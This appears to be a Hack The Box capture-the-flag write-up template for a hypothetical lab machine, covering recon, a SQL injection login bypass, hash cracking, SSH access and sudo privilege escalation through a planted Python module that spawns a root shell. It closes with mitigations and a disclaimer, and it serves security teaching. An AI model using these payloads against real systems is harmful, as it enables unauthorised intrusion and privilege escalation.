---
title: "HTB – Example"
date: 2025-11-03
platform: "Hack The Box"
difficulty: "Medium"
author: "Alex"
tags: ["web", "sqli", "linux"]
---

# Summary
Enumeration → SQLi → credentials → lateral movement → privilege escalation via sudoers.

> **Spoiler warning:** This write-up contains full exploitation steps and proof. Read only if you accept spoilers.

---

## Recon
Run an initial nmap scan and save results:

```bash
nmap -sC -sV -oN assets/attachments/nmap-example.txt 10.10.10.10
```

Check for web services and common directories:

```bash
gobuster dir -u http://10.10.10.10 -w /path/to/wordlist.txt -o assets/attachments/gobuster.txt
```

---

## Foothold / Exploitation
A basic SQL injection was found on `/login`. The following payload bypassed authentication:

```http
POST /login HTTP/1.1
Host: 10.10.10.10
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1&password=anything
```

Using that access, we retrieved an admin panel and found credentials for an internal service.

---

## Post-exploitation and Lateral Movement
With the recovered credentials, we accessed an internal API and found a backup file containing a secondary user's password hash. Crack the hash locally:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Use the cracked credentials to SSH into the box:

```bash
ssh user@10.10.10.10
```

---

## Privilege Escalation
On the target, `sudo -l` revealed the following:

```
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/python3 /opt/scripts/maintenance.py
```

Reviewing `/opt/scripts/maintenance.py` showed it loads modules from a writable directory, enabling a Python-based privilege escalation via module import (simple example: create a malicious module and execute it with the allowed command).

Steps (local on target):

```bash
echo 'import os; os.system("/bin/sh -p")' > /tmp/malicious.py
python3 /opt/scripts/maintenance.py
# then get root shell
```

---

## Screenshots / Proof
Example embedded image (store images under `docs/assets/images/`):

![Admin panel](../../assets/images/htb-example-1.png){ width=600 loading=lazy }

---

## Artifacts
- `assets/attachments/nmap-example.txt` — Nmap scan output.
- `assets/attachments/gobuster.txt` — directory enumeration.
- `assets/attachments/hash.txt` — captured hash (redacted if needed).

---

## Mitigations and Lessons Learned
- Sanitize SQL inputs or use prepared statements to prevent SQLi.
- Avoid storing sensitive credentials in backups or public directories.
- Restrict `sudo` rules to minimal, well-audited scripts and avoid allowing arbitrary script execution without validation.

---

## References
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- GTFOBins (for sudo misuse patterns): https://gtfobins.github.io/

---

**Disclaimer:** This write-up documents a retired/hypothetical lab. Do not use these techniques against systems you do not own or have explicit permission to test.

